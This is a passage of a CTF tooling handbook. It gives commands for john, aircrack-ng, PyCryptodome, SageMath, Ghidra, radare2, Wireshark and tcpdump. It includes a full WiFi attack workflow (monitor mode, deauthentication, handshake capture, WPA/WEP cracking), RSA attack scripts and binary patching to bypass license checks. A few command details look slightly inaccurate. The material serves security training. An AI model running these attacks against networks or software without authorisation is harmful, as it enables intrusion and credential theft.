john --fork=4 hashes.txt
```

`--fork=4` uses 4 processes. Set to number of CPU cores for optimal performance.

GPU acceleration (OpenCL, if compiled with support):

```bash
john --device-id=all hashes.txt
```

Not all John builds include GPU support; compile from source for GPU acceleration.

##### Output Filtering

Show cracked passwords only:

```bash
john hashes.txt --show
```

Show statistics:

```bash
john hashes.txt --status
```

Export cracked hashes:

```bash
john hashes.txt --format=md5 --wordlist=pass.txt -o results.txt
```

### `aircrack-ng`

Aircrack-ng is a suite for WiFi security testing, including wireless traffic capture, password cracking, and protocol analysis. In CTF scenarios involving wireless networks, it's essential for hash extraction and brute-force attacks.

##### Capturing Wireless Traffic

Set wireless interface to monitor mode:

```bash
sudo airmon-ng start wlan0
```

Creates monitoring interface (e.g., `wlan0mon`). Verify:

```bash
iwconfig wlan0mon
```

Capture WiFi traffic to PCAP file:

```bash
sudo airodump-ng -w capture -c 6 wlan0mon
```

`-w capture` writes to `capture-01.cap`. `-c 6` focuses on channel 6. Scans all channels if `-c` omitted (slower).

Target specific network:

```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
```

`--bssid` filters to single network. Monitor until handshake captured (top-right shows "WPA handshake: AA:BB:CC:DD:EE:FF").

##### Deauthentication Attack

Force clients to reconnect, capturing WPA handshake:

```bash
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

`-0` specifies deauth attack. `10` is packet count. `-a` is target BSSID. Clients re-authenticate within seconds, enabling handshake capture.

Target specific client:

```bash
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c XX:XX:XX:XX:XX:XX wlan0mon
```

`-c` specifies target client MAC.

##### Extracting HASH from PCAP

Extract hashes for offline cracking:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

Aircrack attempts to crack directly if wordlist provided. Output:

```
KEY FOUND! [ PASSWORD123 ]
```

[Unverified] The success rate depends on wordlist quality and password complexity. Weak passwords (common dictionary words) crack within seconds on modern hardware.

Extract hash for external tools (john, hashcat):

```bash
hcxdumptool -i capture-01.cap -o hash.hc22000
```

Alternative for older format:

```bash
aircrack-ng capture-01.cap --output=hashcat
```

Generates hashcat-compatible format for GPU-accelerated cracking.

Convert to John format:

```bash
wpa2john capture-01.cap > capture.john
john capture.john --wordlist=rockyou.txt
```

##### WEP Cracking

WEP (legacy, broken encryption) cracks differently. Capture traffic:

```bash
sudo airodump-ng -c 6 -w wep_capture wlan0mon
```

Arpreplay to generate traffic:

```bash
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
```

`-3` specifies ARP replay attack. Captures sufficient IV data for cracking.

Crack WEP key:

```bash
aircrack-ng wep_capture-01.cap
```

WEP cracks with statistical analysis of collected IVs. Success rate increases with IV count (typically 100,000+ IVs needed).

##### Session Resumption

Resume incomplete capture:

```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture --continue wlan0mon
```

`--continue` appends to existing capture file instead of overwriting.

##### Offline Analysis

Analyze capture without live interface:

```bash
aircrack-ng capture-01.cap -w rockyou.txt
```

Multi-file analysis:

```bash
aircrack-ng capture-01.cap capture-02.cap -w rockyou.txt
```

Processes multiple captures sequentially, useful for distributed captures.

##### GPS Tagging and Metadata

Capture GPS coordinates during sniffing (requires GPS device):

```bash
sudo airodump-ng -w capture -c 6 --gpsd wlan0mon
```

`--gpsd` integrates gpsd daemon for geolocation. Generates `.gps` file with coordinates.

View captured network metadata:

```bash
airodump-ng capture-01.cap
```

Displays BSSID, channel, signal strength, encryption type, and client count from existing capture.

##### WPA3 Considerations

[Unverified] WPA3 (Simultaneous Authentication of Equals) replaces traditional four-way handshake with Simultaneous Authentication of Equals (SAE), making traditional capture-based attacks ineffective. Current aircrack-ng versions have limited WPA3 support.

Attempt WPA3 capture:

```bash
sudo airodump-ng -c 6 -w wpa3_capture wlan0mon
```

Monitor for WPA3 networks (identified as "WPA3" in encryption column). Offline cracking requires SAE-specific tools or vulnerability exploitation (not mainstream in standard aircrack-ng).

##### Cleanup

Disable monitor mode after capture:

```bash
sudo airmon-ng stop wlan0mon
```

Restores wireless interface to managed mode. Necessary to restore normal WiFi connectivity.

##### Integration with Hash Cracking

Workflow: Capture → Extract Hash → Crack with john/hashcat

```bash
# 1. Capture handshake
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon

# 2. Extract hash for hashcat
hcxdumptool -i capture-01.cap -o hash.hc22000

# 3. Crack with GPU
hashcat -m 22000 hash.hc22000 rockyou.txt

# Or with john
wpa2john capture-01.cap > capture.john
john capture.john --wordlist=rockyou.txt --fork=4
```

Related Topics: Wireless Protocol Analysis (802.11 frame dissection), Pre-Shared Key Derivation (PBKDF2, PBKDF2-HMAC-SHA1), Rainbow Table Generation (preprocessing for fast lookups), Distributed Cracking (coordinating multiple systems for large keyspaces).

---

## Optional Installation

### python3-pycryptodome

PyCryptodome is a self-contained Python cryptographic library, fork of PyCrypto, providing implementations of cryptographic primitives essential for CTF cryptography challenges.

#### Installation Methods

**Kali Linux:**

bash

```bash
# APT installation
sudo apt update
sudo apt install python3-pycryptodome

# Verify installation
python3 -c "from Crypto.Cipher import AES; print('PyCryptodome installed')"

# Check version
python3 -c "import Crypto; print(Crypto.__version__)"
```

**pip Installation:**

bash

```bash
# System-wide installation
sudo pip3 install pycryptodome

# User installation (no sudo required)
pip3 install --user pycryptodome

# Virtual environment (recommended for isolated projects)
python3 -m venv ctf_env
source ctf_env/bin/activate
pip3 install pycryptodome
```

**Conflict Resolution:**

bash

```bash
# Remove PyCrypto if installed (conflicts with PyCryptodome)
pip3 uninstall pycrypto

# Install PyCryptodome as drop-in replacement
pip3 install pycryptodome

# Alternative: PyCryptodomex (separate namespace)
pip3 install pycryptodomex
# Import as: from Cryptodome.Cipher import AES
```

#### Core Modules and Usage

**Block Ciphers:**

python

```python
from Crypto.Cipher import AES, DES, DES3, Blowfish, ARC4

# AES-256 CBC encryption
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)  # 256-bit key
iv = get_random_bytes(16)   # 128-bit IV
cipher = AES.new(key, AES.MODE_CBC, iv)

plaintext = b"Secret message"
padded = pad(plaintext, AES.block_size)
ciphertext = cipher.encrypt(padded)

# Decryption
decipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = unpad(decipher.decrypt(ciphertext), AES.block_size)

# AES-GCM (authenticated encryption)
cipher = AES.new(key, AES.MODE_GCM)
ciphertext, tag = cipher.encrypt_and_digest(plaintext)
nonce = cipher.nonce

# Decryption with verification
decipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
decrypted = decipher.decrypt_and_verify(ciphertext, tag)
```

**Hash Functions:**

python

```python
from Crypto.Hash import SHA256, SHA512, MD5, SHA1, SHA3_256

# SHA-256 hash
h = SHA256.new()
h.update(b"data to hash")
digest = h.hexdigest()

# HMAC
from Crypto.Hash import HMAC, SHA256
secret = b"secret_key"
h = HMAC.new(secret, digestmod=SHA256)
h.update(b"message")
mac = h.hexdigest()

# SHA3-256
from Crypto.Hash import SHA3_256
h = SHA3_256.new()
h.update(b"data")
digest = h.hexdigest()
```

**Public Key Cryptography:**

python

```python
from Crypto.PublicKey import RSA, DSA, ECC
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Signature import pkcs1_15

# RSA key generation
key = RSA.generate(2048)
private_key = key.export_key()
public_key = key.publickey().export_key()

# RSA encryption (PKCS#1 OAEP)
recipient_key = RSA.import_key(public_key)
cipher = PKCS1_OAEP.new(recipient_key)
ciphertext = cipher.encrypt(b"Secret message")

# RSA decryption
private_key_obj = RSA.import_key(private_key)
decipher = PKCS1_OAEP.new(private_key_obj)
plaintext = decipher.decrypt(ciphertext)

# RSA signature (PKCS#1 v1.5)
from Crypto.Hash import SHA256
message = b"Message to sign"
h = SHA256.new(message)
signature = pkcs1_15.new(private_key_obj).sign(h)

# Verify signature
try:
    pkcs1_15.new(recipient_key).verify(h, signature)
    print("Signature valid")
except (ValueError, TypeError):
    print("Signature invalid")
```

**Key Derivation:**

python

```python
from Crypto.Protocol.KDF import PBKDF2, scrypt, HKDF
from Crypto.Hash import SHA256

# PBKDF2
password = b"password"
salt = b"random_salt"
key = PBKDF2(password, salt, dkLen=32, count=100000)

# scrypt (memory-hard KDF)
key = scrypt(password, salt, key_len=32, N=2**14, r=8, p=1)

# HKDF (HMAC-based KDF)
from Crypto.Hash import SHA256
master_key = b"master_secret"
salt = b"optional_salt"
info = b"context_info"
key = HKDF(master_key, 32, salt, SHA256, context=info)
```

**Random Number Generation:**

python

```python
from Crypto.Random import get_random_bytes
from Crypto.Random.random import randint, choice

# Cryptographically secure random bytes
random_bytes = get_random_bytes(16)

# Random integer in range
random_int = randint(1, 100)

# Random choice from list
random_element = choice([1, 2, 3, 4, 5])
```

#### CTF-Specific Utilities

**CBC Bit Flipping:**

python

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Modify ciphertext to alter plaintext
def flip_bit(ciphertext, block_num, byte_pos, bit_pos):
    ct_list = list(ciphertext)
    ct_list[block_num * 16 + byte_pos] ^= (1 << bit_pos)
    return bytes(ct_list)

# XOR manipulation for known plaintext
def xor_bytes(a, b):
    return bytes([x ^ y for x, y in zip(a, b)])

# Modify previous block to change current block plaintext
known_plain = b"user=guest"
desired_plain = b"user=admin"
xor_diff = xor_bytes(known_plain, desired_plain)
# Apply xor_diff to previous ciphertext block
```

**ECB Detection and Exploitation:**

python

```python
def detect_ecb(ciphertext, block_size=16):
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    return len(blocks) != len(set(blocks))

# ECB byte-at-a-time attack helper
def ecb_oracle_attack(oracle, block_size=16):
    # oracle is a function that encrypts controlled input
    known = b""
    
    for i in range(256):  # Assuming 256-byte secret
        prefix = b"A" * (block_size - 1 - (len(known) % block_size))
        target_block = oracle(prefix)[:block_size]
        
        for byte in range(256):
            test = oracle(prefix + known + bytes([byte]))[:block_size]
            if test == target_block:
                known += bytes([byte])
                break
    
    return known
```

### sage (SageMath)

SageMath is a comprehensive mathematics software system integrating numerous open-source packages, essential for advanced cryptographic attacks involving number theory, elliptic curves, and lattice-based cryptography.

#### Installation Methods

**Docker Installation (Recommended):**

bash

```bash
# Pull SageMath Docker image
docker pull sagemath/sagemath:latest

# Run interactive SageMath session
docker run -it sagemath/sagemath:latest

# Mount current directory for file access
docker run -it -v $(pwd):/home/sage/work sagemath/sagemath:latest

# Run Sage Jupyter notebook
docker run -p 8888:8888 sagemath/sagemath:latest sage-jupyter
```

**APT Installation (Kali):**

bash

```bash
# Install from repositories
sudo apt update
sudo apt install sagemath

# Launch SageMath
sage

# Run Sage script
sage script.sage

# Convert .sage to .py
sage --preparse script.sage
```

**Build from Source:**

bash

```bash
# Prerequisites
sudo apt install build-essential m4 perl python3 python3-distutils

# Clone repository
git clone https://github.com/sagemath/sage.git
cd sage

# Configure and build (takes several hours)
make configure
./configure
make

# Run SageMath
./sage
```

**CoCalc (Online Alternative):**

```
# Browser-based SageMath environment
# URL: https://cocalc.com
# No installation required, includes collaboration features
```

#### Core Mathematical Features

**Integer Factorization:**

python

```python
# Launch sage
sage

# Factor large integers
n = 123456789012345678901234567890
factor(n)

# Specific factorization methods
# ECM (Elliptic Curve Method)
ecm.factor(n, B1=10000)

# Trial division
trial_division(n, 10000)

# Pollard's rho
Integer(n).pollard_rho()

# Check primality
is_prime(n)
```

**Elliptic Curve Arithmetic:**

python

```python
# Define elliptic curve over finite field
p = 115792089237316195423570985008687907853269984665640564039457584007908834671663
a = 0
b = 7
E = EllipticCurve(GF(p), [a, b])

# Define point
G = E(55066263022277343669578718895168534326250603453777594175500187360389116729240,
      32670510020758816978083085130507043184471273380659243275938904335757337482424)

# Scalar multiplication
k = 12345
P = k * G

# Point addition
Q = G + P

# Discrete log problem (small curves only)
# P = k*G, find k
k = discrete_log(P, G, operation='+')
```

**RSA Attacks:**

python

```python
# Common modulus attack
n = 123456789...
e1 = 65537
e2 = 65539
c1 = ...  # ciphertext with e1
c2 = ...  # ciphertext with e2

# Extended Euclidean algorithm
def egcd(a, b):
    if b == 0:
        return (a, 1, 0)
    else:
        g, y, x = egcd(b, a % b)
        return (g, x, y - (a // b) * x)

g, s1, s2 = egcd(e1, e2)
if g == 1:
    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
    print(long_to_bytes(int(m)))

# Wiener's attack (small private exponent)
def wiener_attack(e, n):
    cf = continued_fraction(e / n)
    convergents = cf.convergents()
    
    for conv in convergents:
        k = conv.numerator()
        d = conv.denominator()
        
        if k == 0:
            continue
            
        phi = (e * d - 1) / k
        
        # Check if phi yields valid factors
        b = n - phi + 1
        discriminant = b^2 - 4*n
        
        if discriminant >= 0:
            sqrt_d = sqrt(discriminant)
            if sqrt_d in ZZ:
                return d
    
    return None
```

**Lattice Reduction (LLL Algorithm):**

python

```python
# LLL basis reduction
M = Matrix(ZZ, [[1, 2, 3], [4, 5, 6], [7, 8, 10]])
L = M.LLL()
print(L)

# Knapsack problem solving with LLL
def solve_knapsack_lll(public_key, target):
    n = len(public_key)
    M = Matrix(ZZ, n + 1, n + 1)
    
    # Build lattice
    for i in range(n):
        M[i, i] = 2
        M[i, n] = public_key[i]
    M[n, n] = target
    
    # Apply LLL
    L = M.LLL()
    
    # Extract solution
    for row in L.rows():
        if all(x in [0, 1] for x in row[:-1]):
            return [x for x in row[:-1]]
    
    return None

# CTF example: subset sum problem
public_key = [2, 3, 6, 13, 27, 52]
target = 82
solution = solve_knapsack_lll(public_key, target)
```

**Discrete Logarithm:**

python

```python
# Solve discrete log in finite field
p = 107
g = 2
h = 42

# Find x such that g^x ≡ h (mod p)
x = discrete_log(mod(h, p), mod(g, p))
print(f"Discrete log: {x}")

# Baby-step giant-step algorithm
x = discrete_log_generic(mod(h, p), mod(g, p))

# Pollard's rho for discrete log
x = discrete_log_rho(mod(h, p), mod(g, p))
```

**Chinese Remainder Theorem:**

python

```python
# Solve system of congruences
# x ≡ a1 (mod m1)
# x ≡ a2 (mod m2)
# ...

remainders = [2, 3, 1]
moduli = [3, 4, 5]

x = CRT_list(remainders, moduli)
print(f"Solution: {x}")

# Alternative syntax
x = crt([2, 3, 1], [3, 4, 5])
```

#### CTF-Specific Sage Scripts

**Coppersmith's Attack (Small Exponent):**

python

```python
# Find small roots of polynomial modulo n
def coppersmith_attack(n, e, c, bits):
    P.<x> = PolynomialRing(Zmod(n))
    f = (x + c)^e - c
    
    # Coppersmith method
    roots = f.small_roots(X=2^bits, beta=0.5)
    
    if roots:
        return roots[0]
    return None

# Example usage
n = 123456789...
e = 3
c = 987654321...
bits = 100

m_low = coppersmith_attack(n, e, c, bits)
```

**Franklin-Reiter Related Message Attack:**

python

```python
def franklin_reiter(n, e, c1, c2, r):
    # m2 = m1 + r
    P.<X> = PolynomialRing(Zmod(n))
    f1 = X^e - c1
    f2 = (X + r)^e - c2
    
    # GCD of polynomials
    result = gcd(f1, f2)
    
    if result.degree() == 1:
        return -result.coefficients()[0]
    return None

# Usage
m = franklin_reiter(n, e, c1, c2, known_difference)
```

### ghidra

Ghidra is an NSA-developed open-source reverse engineering framework, essential for analyzing compiled cryptographic implementations and finding implementation flaws.

#### Installation

**Kali Linux:**

bash

```bash
# Install from repositories
sudo apt update
sudo apt install ghidra

# Launch Ghidra
ghidra

# Or use specific path
/usr/share/ghidra/ghidraRun
```

**Manual Installation:**

bash

```bash
# Download from GitHub releases
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.4_build/ghidra_10.4_PUBLIC_20230928.zip

# Extract
unzip ghidra_10.4_PUBLIC_20230928.zip
cd ghidra_10.4_PUBLIC

# Install JDK (required)
sudo apt install openjdk-17-jdk

# Run Ghidra
./ghidraRun
```

**First-Time Setup:**

bash

```bash
# Create new project
# File → New Project → Non-Shared Project
# Select project directory and name

# Import binary
# File → Import File
# Select target binary
# Auto-analyze when prompted
```

#### Key Features for Crypto Analysis

**Decompiler Usage:**

```
1. Load binary into Ghidra
2. Run auto-analysis (Analysis → Auto Analyze)
3. Navigate to function in Symbol Tree
4. View decompiled C code in Decompile window
5. Cross-reference assembly (Listing window)

# Keyboard shortcuts
G - Go to address/function
L - Set label
; - Add comment
Ctrl+Shift+E - Edit function signature
```

**Identifying Crypto Functions:**

```
# Search for crypto constants
Search → For Scalars
Common values:
- AES S-box: 0x63, 0x7C, 0x77, 0x7B...
- MD5: 0x67452301, 0xEFCDAB89
- SHA-1: 0x67452301, 0xEFCDAB89, 0x98BADCFE
- SHA-256: 0x6A09E667, 0xBB67AE85

# String search for library names
Search → For Strings
Filter: "crypto", "ssl", "aes", "rsa", "sha"

# Find XOR operations (common in crypto)
Search → Instruction Patterns
Pattern: XOR
```

**Function Analysis:**

```
# Analyze encryption routine
1. Identify function entry point
2. Track key/IV parameters
3. Identify rounds/iterations
4. Look for weak constants
5. Check for implementation errors

# Example: Finding AES key schedule
# Look for function with:
# - 10/12/14 rounds (AES-128/192/256)
# - Rcon constants
# - Shift/substitute operations

# Script to find constants
Window → Script Manager
Run: FindCryptoConstants.java
```

**Data Flow Analysis:**

```
# Track sensitive data
1. Right-click variable → References → Show References to
2. Follow data through function calls
3. Identify where keys are stored
4. Check for hardcoded secrets

# Example: Trace key variable
# Select key parameter
# Right-click → Highlight → Forward Slicing
```

**Patching Binaries:**

```
# Patch instructions
1. Navigate to instruction
2. Right-click → Patch Instruction
3. Modify assembly
4. Export patched binary: File → Export Program

# NOP out checks
# Replace instruction with 0x90 (NOP)
# Common for bypassing license checks or validation

# Change conditional jumps
JNE → JE (0x75 → 0x74)
JE → JNE (0x74 → 0x75)
```

#### Ghidra Scripts for Crypto

**Python Script - Find XOR Keys:**

python

```python
# Find XOR operations with constants
# Ghidra Script: find_xor_keys.py

from ghidra.program.model.block import BasicBlockModel
from ghidra.program.model.pcode import PcodeOp

def find_xor_operations():
    program = getCurrentProgram()
    listing = program.getListing()
    
    func_iter = listing.getFunctions(True)
    
    for func in func_iter:
        inst_iter = listing.getInstructions(func.getBody(), True)
        
        for inst in inst_iter:
            if inst.getMnemonicString() == "XOR":
                operands = inst.getDefaultOperandRepresentationList(1)
                if operands and operands[0].startswith("0x"):
                    print(f"XOR with constant at {inst.getAddress()}: {operands[0]}")

find_xor_operations()
```

**Identify Base64 Tables:**

python

```python
# Find Base64 encoding tables
# Common pattern: "ABCDEFGHIJKLMNOPQRSTUVWXYZ..."

from ghidra.program.model.mem import MemoryAccessException

def find_base64_table():
    program = getCurrentProgram()
    memory = program.getMemory()
    
    base64_std = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    search_bytes = base64_std[:20].encode()  # Search first 20 chars
    
    address = memory.findBytes(memory.getMinAddress(), search_bytes, None, True, monitor)
    
    if address:
        print(f"Potential Base64 table at: {address}")
        data = memory.getBytes(address, 64)
        print(f"Table: {data.decode('latin-1')}")

find_base64_table()
```

### radare2

Radare2 is a powerful command-line reverse engineering framework with extensive analysis capabilities, offering detailed control for crypto binary analysis.

#### Installation

**Kali Linux:**

bash

```bash
# Install from repositories
sudo apt update
sudo apt install radare2

# Verify installation
r2 -v

# Install additional tools
sudo apt install radare2-cutter  # GUI frontend
```

**Git Installation (Latest Version):**

bash

```bash
# Clone and build
git clone https://github.com/radareorg/radare2
cd radare2
sys/install.sh

# Update radare2
sys/install.sh

# Uninstall
make uninstall
```

#### Basic Commands

**Opening and Analyzing Files:**

bash

```bash
# Open binary in write mode
r2 -w binary

# Open in debug mode
r2 -d binary

# Auto-analysis
r2 -A binary

# Open with specific architecture
r2 -a x86 -b 64 binary
```

**Navigation:**

bash

```bash
# Inside r2
aaa          # Analyze all (functions, references)
afl          # List functions
pdf @ main   # Print disassembly of main function
s main       # Seek to main function
s 0x400000   # Seek to specific address

# Visual mode
V            # Enter visual mode
VV           # Visual graph mode
p            # Cycle print modes
q            # Quit visual mode
```

**Searching:**

bash

```bash
# Search for strings
iz           # List strings in data sections
izz          # List all strings
/ keyword    # Search for keyword

# Search for hex bytes
/x 6a0f05    # Search for syscall pattern

# Search for crypto constants
/x 6745230198badcfe  # SHA-1 constants
/x 67e6096a85ae67bb  # SHA-256 constants

# Search for XOR operations
/R xor       # Search for XOR instructions
```

#### Crypto-Specific Analysis

**Identify Crypto Functions:**

bash

```bash
# Analyze binary
r2 -A crypto_binary

# List functions with crypto-related names
afl | grep -i crypt
afl | grep -i aes
afl | grep -i rsa
afl | grep -i sha

# Analyze imports
ii | grep -i crypto

# Find cross-references to crypto functions
axt @ sym.imp.EVP_EncryptInit  # OpenSSL example
```

**Disassemble and Decompile:**

bash

```bash
# Disassemble function
pdf @ sym.encrypt_function

# Decompile with r2ghidra plugin
pdg @ sym.encrypt_function

# Show function arguments
afa          # Analyze function arguments
afv          # List variables in function
```

**Data Inspection:**

bash

```bash
# Print hex dump
px 64 @ 0x601000

# Print as string
ps @ 0x601000

# Print bytes
p8 32 @ 0x601000

# Visual hex editor
V!

# Compare memory regions
c 0x400000 0x500000
```

**Dynamic Analysis:**

bash

```bash
# Start debugging
r2 -d binary

# Set breakpoint
db 0x400550
db sym.encrypt_function

# Continue execution
dc

# Step instruction
ds

# Step over
dso

# Print registers
dr           # All registers
dr rax       # Specific register

# Examine stack
pxw 64 @ rsp

# Dump memory region
dm           # List memory maps
dmh          # Heap information
```

#### Radare2 Scripts (r2pipe)

**Python Integration:**

bash

```bash
# Install r2pipe
pip3 install r2pipe
```

**Python Script - Extract Crypto Constants:**

python

```python
#!/usr/bin/env python3
import r2pipe

# Open binary
r2 = r2pipe.open("crypto_binary")

# Analyze
r2.cmd("aaa")

# Find SHA-256 constants
sha256_constants = [
    "6a09e667", "bb67ae85", "3c6ef372", "a54ff53a",
    "510e527f", "9b05688c", "1f83d9ab", "5be0cd19"
]

print("[*] Searching for SHA-256 constants...")
for const in sha256_constants:
    results = r2.cmd(f"/x {const}")
    if results:
        print(f"Found {const}:\n{results}")

# List all functions
functions = r2.cmdj("aflj")  # JSON output
for func in functions:
    if "crypt" in func.get("name", "").lower():
        print(f"[+] Crypto function: {func['name']} at {hex(func['offset'])}")

r2.quit()
```

**Extract XOR Keys:**

python

```python
import r2pipe
import re

r2 = r2pipe.open("binary")
r2.cmd("aaa")

# Find XOR instructions
xor_instructions = r2.cmd("/R xor")

# Parse for constants
for line in xor_instructions.split('\n'):
    match = re.search(r'xor.*0x([0-9a-f]+)', line)
    if match:
        const = match.group(1)
        print(f"XOR key candidate: 0x{const}")

r2.quit()
```

#### r2frida (Dynamic Instrumentation)

**Installation:**

bash

```bash
# Install frida tools
pip3 install frida-tools

# Install r2frida
r2pm -ci r2frida
```

**Usage:**

bash

```bash
# Attach to running process
r2 frida://process_name

# Attach with spawn
r2 frida://spawn/binary

# Hook functions
:. hook_crypto.js

# Intercept crypto calls
\dt      # List threads
\df      # List functions
\db 0x.. # Set breakpoint
```

### wireshark

Wireshark is a network protocol analyzer providing deep inspection of network traffic, crucial for analyzing encrypted communications and identifying crypto vulnerabilities in network protocols.

#### Installation

**Kali Linux:**

bash

```bash
# Already pre-installed on Kali
wireshark

# Install if missing
sudo apt update
sudo apt install wireshark

# Add user to wireshark group (capture without sudo)
sudo usermod -aG wireshark $USER
newgrp wireshark

# Configure dumpcap permissions
sudo dpkg-reconfigure wireshark-common  # Select 'Yes'
```

**TShark (CLI Version):**

bash

```bash
# Command-line packet analysis
tshark -i eth0

# Capture to file
tshark -i eth0 -w capture.pcap

# Read from file
tshark -r capture.pcap
```

#### Crypto Traffic Analysis

**SSL/TLS Decryption:**

bash

```bash
# Method 1: Using server private key
# Edit → Preferences → Protocols → TLS
# RSA keys list: Add server IP, port, protocol, and key file

# Example format:
# 192.168.1.100,443,http,/path/to/server.key

# Method 2: Using SSLKEYLOGFILE (Firefox/Chrome)
# Set environment variable before launching browser:
export SSLKEYLOGFILE=/tmp/sslkeys.log
firefox

# In Wireshark:
# Preferences → Protocols → TLS
# (Pre)-Master-Secret log filename: /tmp/sslkeys.log
```

**Display Filters for Crypto:**

bash

```bash
# SSL/TLS handshake
ssl.handshake || tls.handshake

# TLS Client Hello
tls.handshake.type == 1

# TLS Server Hello
tls.handshake.type == 2

# Certificate messages
tls.handshake.type == 11

# Cipher suites offered
tls.handshake.ciphersuite

# Specific cipher (3DES example)
tls.handshake.ciphersuite == 0x000a

# Show decrypted HTTP
http && tls

# SSH traffic
ssh

# IPSec
esp || ah || isakmp
```

**Protocol-Specific Analysis:**

bash

```bash
# Export SSL/TLS session keys
# Statistics → TLS → Export Session Keys

# Analyze cipher negotiation
tls.handshake.ciphersuite

# Check for weak ciphers
tls.handshake.ciphersuite == 0x0005  # RSA_WITH_RC4_128_SHA
tls.handshake.ciphersuite == 0x000a  # RSA_WITH_3DES_EDE_CBC_SHA

# Certificate extraction
# Right-click on Certificate → Export Packet Bytes

# Identify TLS versions
tls.record.version == 0x0300  # SSL 3.0
tls.record.version == 0x0301  # TLS 1.0
tls.record.version == 0x0302  # TLS 1.1
tls.record.version == 0x0303  # TLS 1.2
tls.record.version == 0x0304  # TLS 1.3
```

#### Command-Line Analysis

**TShark Crypto Filtering:**

bash

```bash
# Extract SSL/TLS handshakes
tshark -r capture.pcap -Y "ssl.handshake" -T fields -e ssl.handshake.ciphersuite

# List cipher suites
tshark -r capture.pcap -Y "tls.handshake.type == 1" -T fields -e tls.handshake.ciphersuite | sort -u

# Extract certificates
tshark -r capture.pcap -Y "ssl.handshake.certificate" -T fields -e ssl.handshake.certificate > cert.der

# Decrypt with key log
tshark -r capture.pcap -o tls.keylog_file:/tmp/sslkeys.log -Y "http" -T fields -e http.request.uri

# Export decrypted traffic
tshark -r capture.pcap -o tls.keylog_file:/tmp/sslkeys.log --export-objects http,/tmp/http_objects/
```

**Statistics and Analysis:**

bash

```bash
# Protocol hierarchy
tshark -r capture.pcap -qz io,phs

# Conversations
tshark -r capture.pcap -qz conv,tcp

# Endpoints
tshark -r capture.pcap -qz endpoints,tcp

# TLS version distribution
tshark -r capture.pcap -Y "tls" -T fields -e tls.record.version | sort | uniq -c
```

#### Wireshark Lua Scripts

**Custom Crypto Dissector:**

```lua
-- Save as crypto_protocol.lua in Wireshark plugins directory
-- ~/.local/lib/wireshark/plugins/ or /usr/lib/x86_64-linux-gnu/wireshark/plugins/

crypto_proto = Proto("CustomCrypto", "Custom Crypto Protocol")

local f_magic = ProtoField.uint32("crypto.magic", "Magic", base.HEX)
local f_cipher = ProtoField.uint8("crypto.cipher", "Cipher Type", base.HEX)
local f_keylen = ProtoField.uint16("crypto.keylen", "Key Length", base.DEC)
local f_data = ProtoField.bytes("crypto.data", "Encrypted Data")

crypto_proto.fields = {f_magic, f_cipher, f_keylen, f_data}

function crypto_proto.dissector(buffer, pinfo, tree) length = buffer:len() if length == 0 then return end

pinfo.cols.protocol = crypto_proto.name

local subtree = tree:add(crypto_proto, buffer(), "Custom Crypto Protocol Data")

subtree:add(f_magic, buffer(0,4))
subtree:add(f_cipher, buffer(4,1))
subtree:add(f_keylen, buffer(5,2))
subtree:add(f_data, buffer(7, length-7))

end

local tcp_port = DissectorTable.get("tcp.port") tcp_port:add(9999, crypto_proto) -- Register on port 9999
```

**XOR Key Detection:**
```lua
-- xor_detector.lua
-- Detect XOR encrypted traffic patterns

function detect_xor(tvb, pinfo, tree)
    local length = tvb:len()
    if length < 10 then return end
    
    local subtree = tree:add("XOR Analysis")
    
    -- Check for repeated byte patterns (weak XOR)
    local bytes = {}
    for i = 0, math.min(length-1, 100) do
        bytes[i+1] = tvb(i,1):uint()
    end
    
    -- Calculate entropy (low entropy might indicate XOR)
    local counts = {}
    for _, byte in ipairs(bytes) do
        counts[byte] = (counts[byte] or 0) + 1
    end
    
    local entropy = 0
    for _, count in pairs(counts) do
        local p = count / #bytes
        entropy = entropy - (p * math.log(p) / math.log(2))
    end
    
    subtree:add("Entropy: " .. string.format("%.2f", entropy))
    
    if entropy < 4.0 then
        subtree:add("WARNING: Low entropy detected - possible XOR encryption")
    end
end

-- Register as postdissector
register_postdissector(detect_xor)
```

#### Advanced Features

**SSL/TLS Stream Export:**
```bash
# GUI Method:
# File → Export Objects → HTTP
# (After decrypting with key log)

# Export specific stream
# Right-click packet → Follow → TLS Stream
# Save As → Raw

# Command-line export
tshark -r capture.pcap -qz follow,tls,raw,0 > stream0.bin
```

**Packet Manipulation:**
```bash
# Edit packets (requires editcap)
editcap capture.pcap modified.pcap

# Remove packets
editcap -r capture.pcap output.pcap 1-100,200-300

# Change timestamps
editcap -t 3600 capture.pcap output.pcap  # Add 1 hour

# Split large captures
editcap -c 1000 large.pcap split.pcap  # 1000 packets per file
```

### tcpdump

tcpdump is a command-line packet analyzer providing lightweight network traffic capture and filtering, essential for quick crypto traffic analysis.

#### Installation

**Kali Linux:**
```bash
# Pre-installed on Kali
tcpdump --version

# Install if missing
sudo apt install tcpdump

# Verify network interfaces
tcpdump -D
ip link show
```

#### Basic Capture Commands

**Interface Capture:**
```bash
# Capture on specific interface
sudo tcpdump -i eth0

# Capture on all interfaces
sudo tcpdump -i any

# Capture without name resolution (faster)
sudo tcpdump -n -i eth0

# Capture with verbose output
sudo tcpdump -v -i eth0
sudo tcpdump -vv -i eth0  # More verbose
sudo tcpdump -vvv -i eth0  # Maximum verbosity
```

**Output Control:**
```bash
# Write to file
sudo tcpdump -i eth0 -w capture.pcap

# Rotate capture files (100MB each)
sudo tcpdump -i eth0 -w capture.pcap -C 100

# Limit packet count
sudo tcpdump -i eth0 -c 1000 -w capture.pcap

# Print packet contents in hex and ASCII
